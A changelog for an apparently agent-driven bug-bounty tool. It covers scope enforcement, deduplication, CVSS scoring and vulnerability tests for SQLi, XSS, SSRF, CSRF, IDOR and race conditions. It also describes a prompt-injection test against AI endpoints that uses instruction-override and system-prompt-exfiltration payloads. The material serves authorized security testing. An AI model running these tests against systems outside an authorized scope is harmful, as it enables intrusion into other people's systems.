2. **Race condition test gather crash fixed** (`vuln.py:1009`) — `asyncio.gather()` in `test_race()` lacked `return_exceptions=True`. A single failed HTTP request (timeout, connection reset) crashed the entire concurrent batch, losing evidence from all successful requests. Now collects exceptions separately, logs warning with failure count, and analyzes successful responses. Returns early INFO result if all requests fail.

3. **Scope bypass via empty-string fallback fixed** (`httpx_runner.py:75`, `nuclei.py:84`, `whatweb.py:71`) — `extract_scope_target()` used Python's `or` operator: `record.get("host") or record.get("url")`. Empty string `""` is falsy, so records with intentionally empty host fields fell through to the URL field, bypassing the intended scope-check target. Changed to explicit `None`/empty-string check: `host if host is not None and host != "" else record.get("url")`.

4. **FfufAdapter crash on empty targets** (`ffuf.py:51`) — `targets[0]` accessed without bounds check. If `pre_filter_targets()` filtered all targets to empty (all out of scope), raised `IndexError`. Added explicit guard with descriptive `ValueError`.

### Tier 2 — Should-Fix (5 issues)

5. **ScopeEngine.is_in_scope(None) crash fixed** (`scope.py:84`) — Passing `None` to `is_in_scope()` raised `TypeError` in `_guess_entity_type()` when checking `"://" in target`. Added early `if not target: return False` guard. Default-deny: falsy inputs are out of scope.

6. **Dedup queries optimized from O(n) to O(1)** (`context.py:1458-1485`) — `is_duplicate()` and `get_canonical_finding()` fetched ALL dedup groups for a hunt, parsed each JSON array in Python, and looped to find a match. Replaced with single SQL queries using `json_each()` subquery: `WHERE EXISTS (SELECT 1 FROM json_each(finding_ids) WHERE value = ?)`. Constant-time regardless of group count.

7. **Vulnerability test results now persisted as findings** (`vuln.py`) — All 12 vuln test functions (IDOR, SSRF, XSS, SQLi, auth, race, redirect, CSRF, mass assignment, reset, AI) returned `VulnTestResult` objects that were printed by CLI then discarded. Added `_persist_finding()` helper that converts positive results to finding dicts and upserts via `context.upsert_finding()`. Called before `_record_coverage()` in every test function. Only persists when `context`, `hunt_id`, and `vulnerable=True`. This closes the evidence chain: vuln tests -> findings -> dedup -> chaining -> reports.

8. **PoC file writes resilient to I/O errors** (`poc.py:80`) — HTTP dump `write_text()` had no error handling. Disk full or permission errors crashed PoC generation mid-package, leaving manifest inconsistent with files on disk. Wrapped in `try/except OSError` with warning log; `package.http_dumps` only appended after successful write.

9. **`_get_finding_by_id()` exposed as public API** (`context.py:1487`, `draft.py:35`, `poc.py:47`) — Reporting layer depended on private `_get_finding_by_id()`. Renamed to `get_finding_by_id()` and updated all 4 callers (draft.py x2, poc.py x2) plus 2 test references. Stabilizes the cross-layer contract.

---

## 0.3.3 — Final Pre-Prod Hardening

**Date:** 2026-04-02
**Scope:** 8 fixes across core, adapters, tools, and analysis layers. 0 regressions (579 tests pass).

4-agent parallel review of all layers after V1/V2/V3 + 25 rounds of hardening. Triaged ~50 raw findings down to 8 real, actionable issues. Adapters, CLI, and reporting came back clean.

### Tier 1 — Must-Fix (5 issues)

1. **JSON array merge corruption replaced with custom SQLite function** (`context.py`) — The `substr`/`||` concat approach for merging `evidence` and `request_ids` on finding upsert could produce invalid JSON in edge cases (whitespace variants, non-array JSON remnants from pre-0.3.2 data). Replaced entirely with `json_array_merge()`, a Python custom SQLite function registered at connection init. Handles all edge cases: null, `'null'`, `'[]'`, non-array JSON, malformed strings. Always produces valid JSON arrays.

2. **`recon.urls()` now returns `exit_code=1` when all adapters fail** (`recon.py:145`) — `asyncio.gather(return_exceptions=True)` masked adapter failures: the merged `ToolResult` always showed `exit_code=0`. Downstream code couldn't distinguish "both URL sources crashed" from "found 0 URLs." Now tracks adapter failure count and signals non-zero when all fail.

3. **Scope engine enforced at `test_idor()` entry** (`vuln.py:80`) — Scope check only happened in the object-ID enumeration loop, not for the initial three-way comparison (User A / User B / no-auth). A manually triggered IDOR test on an out-of-scope URL would run and persist findings. Now checks `scope_engine.is_in_scope(endpoint)` at function entry and returns early with a skip result.

4. **Findings UNIQUE constraint now includes HTTP method** (`context.py`, `dedup.py`) — UNIQUE was `(hunt_id, finding_type, url, parameter)`, which collapsed `POST /api/users/:id` IDOR and `GET /api/users/:id` IDOR into the same row (overwriting one). Changed to `(hunt_id, finding_type, url, method, parameter)`. Added `method TEXT NOT NULL DEFAULT ''` column with a safe schema migration (table recreation preserving existing data). Dedup keys in both `deduplicate_findings()` and `check_duplicate()` updated to include method.

5. **Output truncation flag propagated to `ToolResult`** (`models.py`, `base.py`) — When subprocess output exceeds the 256 MB cap, `SubprocessResult.output_truncated=True` was set but never surfaced. Added `output_truncated: bool = False` to `ToolResult` and propagated from subprocess result. Base adapter now logs a warning when truncation occurs.

### Tier 2 — Should-Fix (3 issues)

6. **IP CIDR exclusion logic made symmetric** (`scope.py:149`) — Exclusion checks used both `subnet_of` AND `supernet_of`, but inclusion only checked `subnet_of`. This asymmetry meant a target CIDR that was a supernet of an excluded range got rejected entirely (e.g., excluding `10.0.0.0/24` blocked the entire `10.0.0.0/23`). Removed `supernet_of` from exclusion checks. Exclusions now only reject CIDRs that fall within (are subnets of) excluded ranges, consistent with how inclusions work.

7. **`HuntContext` documented as single-threaded** (`context.py`) — The `_in_transaction` instance flag is not thread-safe, but `sqlite3.connect()` defaults to `check_same_thread=True`, which prevents cross-thread access at the connection level. Added class docstring documenting that each thread must use its own `HuntContext` instance.

8. **Vuln test functions now have configurable deadlines** (`vuln.py`) — `test_sqli`, `test_xss`, `test_ssrf`, and `test_ai` loop through 50–100+ payloads with only per-request timeouts (15s). A slow target could cause tests to hang for 10+ minutes. Added `max_test_seconds: float = 300` parameter and deadline checking at the top of each outer loop. Tests exit gracefully with partial results when the deadline is reached.

---

## 0.3.2 — Production Readiness Sweep

**Date:** 2026-04-02
**Scope:** 25 fixes across all layers, 0 new tests needed (existing 579 pass), 0 regressions

6-agent parallel codebase review across all layers (core, adapters, interaction, tools/vuln, analysis/reporting, CLI/tests). 26 raw findings triaged down to 25 actionable fixes. Recon/enum composition came back clean again — zero bugs after 23+ rounds of hardening.

### Tier 1 — Must-Fix (6 issues)

1. **Reports UNIQUE constraint broken by SQLite NULL semantics** (`context.py:360`) — `UNIQUE(hunt_id, finding_id, chain_id)` never deduplicates when `finding_id` or `chain_id` is NULL (the common case), so every `upsert_report` inserted a new row. Added partial unique indexes: `idx_reports_finding (hunt_id, finding_id) WHERE chain_id IS NULL` and `idx_reports_chain (hunt_id, chain_id) WHERE finding_id IS NULL`. Upsert dedup now works for all cases.

2. **Evidence merge via `substr` concat corrupts non-array JSON** (`context.py:1137`) — if a finding's evidence was a dict (not a list), the SQL string surgery produced invalid JSON, permanently losing all evidence on next read. Now normalizes evidence to a JSON array before storage: dicts are wrapped in `[dict]`.

3. **`upsert_report` silently dropped platform fields on conflict** (`context.py:1547-1559`) — `ON CONFLICT DO UPDATE SET` omitted `platform`, `platform_report_id`, `platform_status`, `submitted_at`. Platform submission tracking was silently lost on re-upsert. Added all four fields with COALESCE guards.

4. **Adapter `dict.get(key, [])` returns `None` when JSON field is explicit null** (`httpx_runner.py:69`, `nuclei.py:75,78,79`) — `raw.get("tech", [])` returns `None` (not `[]`) when the key exists with value `null`. Downstream `for` loops crash with `TypeError`. Changed all to `raw.get("key") or []`.

5. **Browser `get_or_create_context` discards new cookies on existing contexts** (`browser.py:105`) — returning the cached context without applying updated cookies meant `apply_session` after login used stale auth. Now calls `ctx.add_cookies(cookies)` on existing contexts.

6. **CSRF invalid-token test used original body with valid CSRF token** (`vuln.py:1166`) — Test 2 sent `body=body` (containing the valid body token) instead of `body=clean_body`, causing false positives. Fixed to use `clean_body`.

### Tier 2 — Should-Fix (9 issues)

7. **`test_auth` skipped JWT tests when endpoint is publicly accessible** (`vuln.py:841`) — `not vulnerable` guard suppressed JWT `alg=none` and claim escalation tests after no-auth access succeeded. Removed the guard so both vulnerability types are independently tested.

8. **Coverage summary returned unfiltered gaps when host specified** (`coverage.py:47`) — `get_coverage_summary(host=...)` had host-scoped counts but hunt-wide gaps. Added host filter to gaps using `urlparse(url).hostname` matching (same pattern as `get_coverage_gaps`).

9. **Coverage type counts were record counts, not distinct endpoint counts** (`coverage.py:41-44`) — `type_counts["xss"] = 10` could mean 2 endpoints tested 5× each, misleading agents. Now counts distinct URLs per test type using `set()`.

10. **Returned chains had `hunt_id=""` in memory** (`chaining.py:280`) — `_build_chain` set `hunt_id=""`, and neither `detect_chains` nor `suggest_chains` updated it on the returned objects. Now both set `chain.hunt_id = hunt_id` after creation.

11. **Temp file leak in ffuf when wordlist missing** (`base.py:291`, `ffuf.py:55`) — `build_command()` was called outside the `try/finally` block, so a `FileNotFoundError` from missing wordlist leaked the output temp file. Moved `build_command` inside `try` with `cmd`/`output_file` pre-initialized to `None`.

12. **Naabu `SCOPE_MODE = "pre"` skipped post-filtering** (`naabu.py:26`) — CNAME-resolved hosts could leak through without scope check. Changed to `"both"` matching httpx, nuclei, and katana for default-deny consistency.

13. **Browser response body fully read before 50 MB cap check** (`browser.py:145`) — OOM vector on multi-GB responses. Added `Content-Length` pre-check: skips body read entirely when declared size exceeds cap.

14. **`_parse_targets(",,,")` returned `[]` instead of `None`** (`main.py:155`) — empty list skipped context-derived target fallback, silently returning zero results. Now returns `None` when all entries are empty.

15. **`check_duplicate` missed cross-type duplicates** (`dedup.py:218`) — only queried same-type findings. Nuclei "http" + manual "sqli" on same URL were not detected as duplicates inline. Now queries all findings and checks exact URL+param matches cross-type.

### Tier 3 — Nice-to-Fix (10 issues)

16. **CSS selector escaping incomplete in `login_form`** (`session.py:98`) — missing escapes for `"` and `]` caused login failure on forms with those characters in field names. Added escapes; also removed `#safe_name` bare selector (unreliable for names with special chars).

17. **OOB `poll()` returned unmatched interactions without metadata** (`oob.py:155`) — interactions that didn't match any listener lacked `listener_id`, `purpose`, etc. Now only returns matched interactions.

18. **`_bodies_similar` JSON comparison fell through to line-based for JSON bodies** (`vuln.py:1514`) — pretty-printed API responses with shared default fields could over-match. JSON path now uses serialized value-token comparison instead of falling through to line-based.

19. **CIDR notation in `is_in_scope` failed** (`scope.py:140`) — `ip_address("10.0.0.0/24")` threw ValueError, rejecting valid in-scope networks. Added CIDR-aware branch using `ip_network` with `subnet_of` checks.

20. **Dead confidence ranking in dedup canonical selection** (`dedup.py:61-64`) — `_CONFIDENCE_RANK` dict with unreachable "likely" level. Simplified to direct boolean: `3 if confirmed else 1`. Removed dead constant.

21. **Bugcrowd formatter duplicated first step** (`formatter.py:86-100`) — step 1 appeared both as "Location" and as first numbered step. Now skips step 0 in "Steps to Reproduce" when Location section is present.

22. **`enum crawl --depth` accepted non-numeric string** (`main.py:473`) — typed as `str` instead of `int`. Changed to `int` with `str()` conversion at adapter boundary.

23. **Removed dead `_run_with_http_cleanup`** (`main.py:65-70`) — defined but never called. Removed function and updated referencing docstring.

24. **`analyze chain --finding-ids` raw ValueError** (`main.py:1097`) — non-integer input produced cryptic Python error. Added try/except with user-friendly message.

25. **27 CLI commands lack integration tests** — test/analyze/report/browser/http command groups have zero CLI coverage. Not fixed in this release; tracked for next hardening pass.

---

## 0.3.1 — Pre-Production Hardening

**Date:** 2026-04-02
**Scope:** 19 fixes across all layers, 0 new tests needed (existing 579 pass), 0 regressions

5-agent parallel codebase review across all layers (core, adapters, interaction, tools/vuln, analysis/reporting, CLI/tests). ~50 raw findings triaged down to 19 real, actionable issues. Adapters layer and recon/enum composition came back clean — zero bugs after 22+ rounds of prior hardening.

### Tier 1 — Must-Fix (6 issues)

1. **CVSS 3.1 Changed-scope formula wrong** (`severity.py:51`) — exponent was `15` (spec: `13`) and missing `* 0.9731` ISC factor. Every Changed-scope score (SSRF, XSS, chains) was systematically inflated. Now matches FIRST specification exactly.

2. **CLI test commands never passed context/hunt_id to vuln functions** (`main.py:1299-1542`) — all 11 CLI `test` commands now pass `context=manager.context, hunt_id=hunt_id`, enabling V3 coverage auto-recording. Previously, `analyze coverage` was blind to all CLI-invoked tests.

3. **Finding UNIQUE constraint broken for NULL urls** (`context.py:1132`) — `UNIQUE(hunt_id, finding_type, url, parameter)` didn't deduplicate when `url IS NULL` (SQLite NULL≠NULL). Now coalesces to empty string: `finding.get("url") or ""`.

4. **Stale chains persist when re-run finds zero** (`chaining.py:174`) — `delete_chains()` was inside `if chains:` block. Moved outside so old chains are always cleared before inserting new ones. Idempotency guarantee restored.

5. **Report severity mismatch between object and DB** (`draft.py:72`) — returned `ReportDraft` used original finding severity while DB record used CVSS severity. Now both use CVSS severity as single source of truth.

6. **`upsert_host` overwrites fields with NULL** (`context.py:530`) — no COALESCE guards on nullable fields (ip, status_code, title, webserver, etc.). Re-running a tool that doesn't emit all fields would wipe data from earlier tools. Added COALESCE guards matching `upsert_technology` pattern.

### Tier 2 — Should-Fix (7 issues)

7. **IDOR `_bodies_similar` JSON comparison ignored values** (`vuln.py:1490`) — compared only JSON key structure, causing false positives on every REST API with consistent schema (same keys, different user data). Now falls through to line-based value comparison when structure matches.

8. **SQLi boolean detection hardcoded single-quote payloads** (`vuln.py:658`) — missed numeric-context injection (`?id=1 AND 1=1`). Now iterates over all `BOOLEAN_BASED` payload pairs (string, numeric, double-quote contexts).

9. **Race condition test flagged any dynamic endpoint** (`vuln.py:976`) — body divergence and `success_count > 1` set `vulnerable=True` on natural variance (timestamps, CSRF tokens). Now body divergence and multiple successes are evidence-only; only status code divergence sets `vulnerable=True`.

10. **URL prefix exclusion bypass via scheme mismatch** (`scope.py:168`) — exclusion `https://example.com/admin` didn't catch `http://example.com/admin`. Added scheme-insensitive matching: strips scheme before prefix comparison.

11. **`chain_order` was sorted IDs, not attack sequence** (`chaining.py:280`) — `sorted(finding_ids)` didn't represent exploitation order. Now orders findings by `required_types` sequence from the chain rule.

12. **Coverage host filter used substring match** (`coverage.py:71`) — `host in url` matched `badapi.example.com` for filter `api.example.com`. Now uses `urlparse(url).hostname == host` for exact matching.

13. **`test race --session` silently ignored missing sessions** (`main.py:1434`) — fell back to unauthenticated test. Now errors out consistently with other test commands.

### Tier 3 — Nice-to-Fix (6 issues)

14. **CSRF test didn't strip body tokens** (`vuln.py:1122`) — only stripped CSRF headers. Now parses JSON and form-encoded bodies to remove known CSRF token parameters before the "no token" test.

15. **XSS encoding-bypass payloads double-encoded** (`xss.py:36`) — `%3Cscript%3E` was re-encoded to `%253C` by `_inject_param`. Stored decoded so single encoding produces intended form.

16. **JSON_ARRAY parser silently dropped non-list JSON** (`base.py:232`) — returned 0 records AND 0 parse errors. Now logs warning and increments `parse_errors`.

17. **`xss_session_hijack` chain matched too broadly** (`chaining.py:92`) — keyword `"confirmed"` matched all confirmed XSS. Replaced with specific indicators: `"stored"`, `"cookie"`, `"session"`.

18. **`upsert_report` always INSERTed, creating duplicates** (`context.py:1534`) — added `UNIQUE(hunt_id, finding_id, chain_id)` constraint and `ON CONFLICT DO UPDATE` clause.

19. **`report format` and `report show` didn't scope by hunt_id** (`main.py:1188,1280`) — reports accessible across hunt boundaries. Now validates `report["hunt_id"] == hunt_id`. Also: invalid platform names now error instead of silently falling back to markdown.

---

## 0.3.0 — Intelligence: Analysis, Chaining & Reporting

**Date:** 2026-04-02
**Scope:** 2 new packages, ~2,500 lines of new code, 579 tests passing (133 new, 0 regressions)

V3 gives agents the ability to assess what they found and communicate it — the intelligence layer that transforms raw vulnerability data into scored, deduplicated, chained findings with platform-ready reports. After V3, the agent's workflow is: discover → test → analyze → score → chain → report → human submits.

### Analysis Engine (`analysis/`)

New package with 5 modules that consume V1/V2 data and produce higher-order intelligence. All analysis modules are read-only against V1/V2 tables — they write only to their own V3 tables.

- **Coverage tracking** (`analysis/coverage.py`) — answers "what have I tested?" and "what should I test next?" Auto-recorded as a side effect of every `test_*` function (no manual logging needed). Cross-joins known endpoints (urls + directories) × test types to compute untested gaps. Summary aggregation for agent reasoning.

- **Finding deduplication** (`analysis/dedup.py`) — detects when multiple tools/tests found the same underlying vulnerability. Uses a union-find algorithm with three signals: (1) exact URL + parameter cross-type match, (2) typed URL + parameter match, (3) same host + parameter + vuln class. Selects a canonical (best) finding per group: confirmed > severity > evidence count > recency. Idempotent — safe to re-run after new findings arrive.

- **CVSS 3.1 severity scoring** (`analysis/severity.py`) — exact implementation of the CVSS 3.1 base score formula per FIRST specification. Auto-scoring heuristics map finding types to CVSS metrics (e.g., SSRF → AV:N/S:C/C:H, XSS stored → AC:L vs reflected → AC:H). Evidence-based refinements (cloud metadata SSRF upgrades to C:H/I:H, write IDOR upgrades I to H). Platform payout mapping for HackerOne and Bugcrowd tiers. Scoring is read-only — never mutates findings.

- **Vulnerability chaining** (`analysis/chaining.py`) — 8 rules-based chain patterns that correlate findings into higher-severity attack chains. Multi-finding chains (redirect + SSRF → internal access, IDOR + SQLi → authenticated data extraction, XSS + CSRF → account takeover). Single-finding evidence-upgrade chains (SSRF + cloud metadata → credential theft, auth bypass + admin evidence → full admin access). Dedup-aware — excludes non-canonical findings. Three-tier confidence: hypothetical → partial → validated.

- **Attack path prioritization** (`analysis/prioritize.py`) — ranks untested endpoints by vulnerability likelihood. Additive scoring: query parameters (+3), auth-related paths (+3), proxy/redirect paths (+3), admin paths (+2.5), API endpoints (+2), hot hosts with existing findings (+2). Suggests which test types to run per endpoint. Already-tested endpoints (with coverage rows) excluded.

### Reporting Pipeline (`reporting/`)

New package with 3 modules — draft → format → package.

- **Report drafting** (`reporting/draft.py`) — `draft_finding_report()` and `draft_chain_report()` generate structured `ReportDraft` objects from finding/chain records. Auto-generates: title (`[Component] — [Vuln Type] via [Param] Leads to [Impact]`), summary, reproduction steps (from evidence + HTTP history), impact statement (concrete, not hypothetical), and type-specific remediation. Persists to reports table.

- **Platform formatting** (`reporting/formatter.py`) — `format_hackerone()`, `format_bugcrowd()`, `format_markdown()`. Each produces copy-paste-ready markdown:
  - HackerOne: Summary, Steps to Reproduce, Impact, Remediation, Supporting Material sections with CVSS vector
  - Bugcrowd: VRT classification (P1–P5), Description, Steps, Impact, Severity Justification sections
  - Generic markdown: clean heading structure for self-hosted programs, email, or Jira

- **PoC packaging** (`reporting/poc.py`) — `package_poc()` compiles evidence into a directory: `requests/*.http` files (RFC 7230 format, importable into Burp/Postman), `evidence.json` (structured evidence array), `README.md` (summary with reproduction steps and file manifest).

### Advanced Vulnerability Tools (6 new test types)

Extends `tools/vuln.py` with 6 new test functions. All auto-record coverage. Brings total vuln test types from 5 to 11.

| Tool | Detection Method | Severity |
|---|---|---|
| `test_race()` | Fire N concurrent requests via `asyncio.gather`, detect divergent status codes / response bodies / multiple successes on one-time actions | High |
| `test_redirect()` | Inject redirect payloads (direct, protocol-relative, backslash, encoded, subdomain confusion), check Location header for external host redirect | Medium |
| `test_csrf()` | Three-signal detection: request without token accepted, invalid token accepted, cross-origin headers accepted. Two signals = confirmed | Medium |
| `test_mass_assign()` | Send extra JSON fields (isAdmin, role, verified, balance, plan), re-fetch to verify persistence. Before/after comparison eliminates false positives | High |
| `test_reset()` | Host header injection (check if attack host reflected in reset link), rate limiting check (5 rapid requests) | High |
| `test_ai()` | Prompt injection via canary markers (instruction override) and leak indicator counting (system prompt exfiltration, ≥3 indicators required) | High |

### New Payloads

- `payloads/redirect.py` — 15 open redirect payloads across 5 categories (direct, protocol-relative, backslash, encoded, subdomain confusion)
- `payloads/csrf.py` — CSRF token parameter names, protection headers, cross-origin test headers
- `payloads/ai.py` — 10 prompt injection payloads (5 exfiltration, 5 override), canary markers, leak indicators

### Schema Extensions

4 new tables, all with appropriate indexes and foreign key constraints:

```sql
-- Coverage: what's been tested (auto-recorded by vuln tools)
coverage (hunt_id, url, method, parameter, test_type, tested_at, tool_run_id, finding_id)
  UNIQUE(hunt_id, url, method, parameter, test_type)

-- Dedup groups: findings representing the same vulnerability
dedup_groups (hunt_id, canonical_id → findings.id, finding_ids JSON, reason)
  UNIQUE(hunt_id, canonical_id)

-- Attack chains: correlated findings with combined severity
chains (hunt_id, title, severity, confidence, cvss_score, cvss_vector,
        finding_ids JSON, chain_order JSON, impact, prerequisites JSON)
  UNIQUE(hunt_id, title)

-- Reports: generated vulnerability reports with platform tracking
reports (hunt_id, finding_id, chain_id, title, severity, cvss_score, cvss_vector,
         summary, steps JSON, impact, remediation, evidence_refs JSON, request_ids JSON,
         platform, platform_report_id, platform_status, status)
```

Context methods added: `upsert_coverage`, `get_coverage`, `get_untested_endpoints`, `insert_dedup_group`, `get_dedup_groups`, `delete_dedup_groups`, `is_duplicate`, `get_canonical_finding`, `_get_finding_by_id`, `upsert_chain`, `get_chains`, `get_chain`, `update_chain_confidence`, `delete_chains`, `upsert_report`, `get_reports`, `get_report`, `update_report_status`.

### New Data Models

- `CoverageEntry`, `CoverageSummary` — coverage tracking dataclasses
- `DedupeGroup` — grouped duplicate findings
- `CVSSScore` — CVSS 3.1 score with all 8 metrics + vector string
- `ChainStatus` enum (hypothetical, validated, partial)
- `AttackChain` — correlated finding chain with CVSS and impact
- `ReportStatus` enum (draft, ready, submitted, accepted, rejected)
- `Platform` enum (hackerone, bugcrowd, generic)
- `ReportDraft` — structured vulnerability report
- `PoCPackage` — evidence package metadata

### New Error Types

- `AnalysisError` — dedup, chaining, or scoring failure
- `ReportError` — report generation or formatting failure

### CLI

2 new command groups + 6 new test commands:

```
boba analyze  {coverage, dedupe, severity, chain, prioritize}
boba report   {draft, format, poc, list, show}
boba test     {race, redirect, csrf, mass-assign, reset, ai}  (new)
```

Key flags:
- `analyze coverage --untested-only --test-type idor,xss --host app.example.com`
- `analyze dedupe --dry-run`
- `analyze severity --finding-id 7 --platform hackerone`
- `analyze chain --finding-ids 3,7,12` / `--validate 1`
- `analyze prioritize --top 10`
- `report draft --finding-id 7` / `--chain-id 1`
- `report format --report-id 1 --platform hackerone`
- `report poc --finding-id 7 --output-dir ./evidence`

### Test Coverage (133 new tests)

| Area | Tests | What's Covered |
|---|---|---|
| Coverage context + analysis | 19 | CRUD, unique constraints, host/type filters, untested gaps, auto-recording from vuln tools, summary aggregation, CLI |
| Dedup context + engine | 20 | Grouping (exact URL, same host, cross-type), canonical selection (confirmed/severity/evidence), idempotent, dry run, inline check, CLI |
| CVSS + severity | 26 | Known vectors (Log4Shell 10.0, reflected XSS 6.1), boundaries, scope changed vs unchanged, auto-scoring all vuln types, payout mapping, batch scoring, CLI |
| Chaining + prioritize | 29 | SSRF cloud chain, auth admin, IDOR+SQLi same host, evidence requirements, dedup exclusion, severity ≥ max, idempotent, suggest/validate, endpoint scoring (params, auth, hot host, proxy, admin), CLI |
| Reporting (draft, format, PoC) | 23 | Draft structure, title format, evidence in steps, chain merges, persistence, HackerOne/Bugcrowd/markdown sections, VRT classification, PoC directory structure, HTTP dump format, CLI |
| Advanced vuln tools | 16 | Race divergent/identical, redirect external/same-host, CSRF token/no-token, mass assign persist/reject, reset host injection/rate limit, AI canary/leak/clean |

### Vuln Tool Auto-Coverage Integration

All 11 `test_*` functions (5 from V2 + 6 new) now accept optional `context` and `hunt_id` parameters. When provided, they call `_record_coverage()` after testing — coverage tracking is automatic, not manual. Backwards compatible: callers that don't pass `context` get identical behavior to V2.

### Design Decisions

1. **Analysis reads V1/V2, writes V3.** Analysis modules never mutate reconnaissance or interaction tables. They read from `urls`, `directories`, `findings`, `http_history` and write only to `coverage`, `dedup_groups`, `chains`, `reports`. This clean data-flow boundary prevents V3 from breaking existing functionality.

2. **CVSS scoring is read-only.** `score_findings()` returns enriched dicts but never writes back to the findings table. The original finding severity is preserved as `original_severity` alongside the computed `cvss_severity`. This makes scoring idempotent and non-destructive.

3. **Chaining is rules-based, not ML-based.** Transparency is critical for agent reasoning — the agent needs to explain *why* a chain was detected in the report. 8 explicit chain rules with named patterns and evidence requirements provide auditable, explainable chains.

4. **Platform API integration intentionally skipped.** Report formatting produces copy-paste-ready output for manual submission. Auto-submission is the highest-risk action in the pipeline (irreversible, externally visible). The human retains control over this step as a deliberate progressive-autonomy checkpoint.

---

## 0.2.21 — Nuclei Collision, Login Deepcopy, IDOR Empty Body & SQLi Confirm

**Date:** 2026-04-01
**Scope:** 8 files fixed, 12 new tests, 446 tests passing (12 new, 0 regressions)

Pre-V3 codebase review: 5-agent parallel review across all layers rated the codebase ~7.5/10. Eight real, actionable findings addressed — four must-fix (data loss, scope bypass, detection false negatives, cache mutation) and four should-fix (CLI completeness, resource lifecycle, detection false positives, context manager support). Test count: 434 → 446.

### Nuclei Findings Silently Overwritten on Same URL (HIGH)

- **`upsert_finding()` collided when multiple Nuclei templates matched the same URL** — The unique constraint `(hunt_id, finding_type, url, parameter)` always had `parameter=""` for Nuclei findings. Two different template matches (e.g., `CVE-2021-44228` and a misconfiguration) on the same URL would collide, with the second silently overwriting the first's title, description, and severity.

  **Fix:** `parameter` is now set to `record.get("template_id", "")`, making the unique key `(hunt_id, "http", url, "CVE-2021-44228")` — naturally distinct per template.

### Session `login_*` Methods Return Mutable Cache References (HIGH)

- **`login_bearer()`, `login_basic()`, `login_cookies()`, `login_header()`, `login_form()` returned the same object stored in `self._cache`** — Unlike `create()` and `get()` which return `copy.deepcopy()`, the login methods returned the raw cached reference. A caller mutating the returned `SessionState` would silently corrupt the in-memory cache without persisting the change.

  **Fix:** All five `login_*` methods now return `copy.deepcopy(state)`, consistent with `create()` and `get()`.

### IDOR False Negatives on Empty Response Bodies (HIGH)

- **`_bodies_similar()` returned `False` when both bodies were empty** — For DELETE endpoints returning `204 No Content`, both User A and User B get empty bodies. The old guard `if not body_a or not body_b: return False` treated this as "not similar," causing confirmed DELETE IDORs to be missed.

  **Fix:** The guard now returns `not body_a and not body_b` — two empty bodies are similar, one empty + one non-empty are not.

### Nuclei `SCOPE_MODE` Should Be "both" (MEDIUM)

- **Nuclei's `matched-at` URL can differ from input targets** — After redirects or via virtual hosting, the output URL may point to a different host than the input. With `SCOPE_MODE = "pre"`, only input targets were scope-checked, allowing out-of-scope findings to be persisted.

  **Fix:** Changed to `SCOPE_MODE = "both"` so both input targets and output URLs are scope-filtered.

### `hunt_create` JSON Output Missing Scope Info (MEDIUM)

- **Agent consumers couldn't verify scope was loaded** — The JSON output for `hunt create` only included `{id, name, status}`. An agent creating a hunt with `--scope` had no way to confirm the scope was parsed correctly.

  **Fix:** JSON output now includes `scope_rules` count.

### Cross-Loop HTTP Client Cleanup (LOW)

- **`_safe_close_http` created a new event loop to close the httpx client** — After `asyncio.run()` closes its loop, the HTTP client was closed on a different loop. While httpx handles this gracefully, it's architecturally fragile.

  **Fix:** Added `_run_with_http_cleanup()` async helper that closes the client inside the same event loop. The `_safe_close_http` fallback remains as a safety net.

### Time-Based SQLi Single-Sample False Positives (LOW)

- **One slow response triggered detection** — A single network hiccup or backend GC pause could cause a 3s+ spike on a non-vulnerable endpoint, producing a false positive. Industry practice (sqlmap, etc.) requires confirmation.

  **Fix:** After an initial slow response, a confirmation request is sent with the same payload. Only if both exhibit ≥3s delay over baseline is the finding reported. A slow-then-fast pattern is discarded as a network fluke.

### `HuntManager` Lacks Context Manager Protocol (LOW)

- **No `__enter__`/`__exit__` meant exception-path connection leaks** — `HuntManager` only had `close_context()`. If an exception occurred before reaching the cleanup call, the SQLite connection leaked.

  **Fix:** Added `__enter__`/`__exit__` that delegate to `close_context()`, enabling `with HuntManager(...) as mgr:` usage.

### Test Coverage (12 new tests)

- **`tests/tools/test_scan.py::TestNucleiScanTemplateIdAsParameter`** (1 test):
  - Two findings with different template_ids for the same URL are both persisted

- **`tests/interaction/test_session.py::TestLoginDeepCopy`** (4 tests):
  - Mutating returned state from `login_bearer` / `login_basic` / `login_cookies` / `login_header` does not corrupt internal cache

- **`tests/tools/test_vuln.py::TestBodiesSimilar`** (2 tests):
  - Both-empty bodies are similar; one-empty + one-non-empty are not

- **`tests/tools/test_vuln.py::TestSQLiTimeBased`** (2 tests):
  - Slow+slow confirmation → detected; slow+fast (fluke) → not detected

- **`tests/cli/test_cli.py::TestHuntCreateJsonScopeRules`** (1 test):
  - `hunt create --format json` includes `scope_rules` key

- **`tests/core/test_hunt.py::TestHuntManagerContextManager`** (2 tests):
  - `with` statement works and closes context; `__enter__` returns self

---

## 0.2.20 — Evidence Merge, Session Create Deepcopy & Fuzz Warnings

**Date:** 2026-04-01
**Scope:** 3 files fixed, 5 new tests, 434 tests passing (5 new, 0 regressions)

Pre-V3 codebase review: 5-agent parallel review across all layers (core, adapters, interaction, tools/vuln, CLI/tests). ~150 raw findings triaged down to 3 real, actionable issues. Adapters layer came back fully clean (zero bugs after 19 rounds of hardening). Tools/vuln detection logic verified sound. The 3 fixes address data loss in finding upserts, a session cache mutation vector, and silent fuzz campaign failures. Test count: 429 → 434.

### Finding Upsert Evidence/Request IDs Overwrite (HIGH)

- **`upsert_finding()` ON CONFLICT replaced evidence and request_ids wholesale** — When the same finding was detected multiple times (same hunt_id + finding_type + url + parameter), the `ON CONFLICT` clause used `evidence = excluded.evidence` and `request_ids = excluded.request_ids`, which discarded all evidence and request IDs from prior detections. For a security tool, this audit trail matters — the first detection's evidence (different payloads, different endpoints, different sessions) was silently lost.

  **Fix:** `evidence` and `request_ids` now use a `CASE` expression that merges the existing and new JSON arrays via string concatenation (`substr` to strip `]`/`[` and join with `,`). Handles NULL and empty-array edge cases on both sides. The merge is append-only — evidence accumulates across detections.

### `session.create()` Returns Mutable Cache Reference (HIGH)

- **`SessionManager.create()` returned the same object stored in `self._cache`** — Unlike `get()` and `list_sessions()` (fixed in 0.2.19) which return `copy.deepcopy()`, `create()` returned the raw `SessionState` object. A caller mutating the returned session (e.g., adding cookies or headers) would silently corrupt the internal cache without persisting changes to the database.

  **Fix:** `create()` now returns `copy.deepcopy(state)`, consistent with `get()` and `list_sessions()`.

### Fuzz BATTERING_RAM/PITCHFORK Silent Empty Results (MEDIUM)

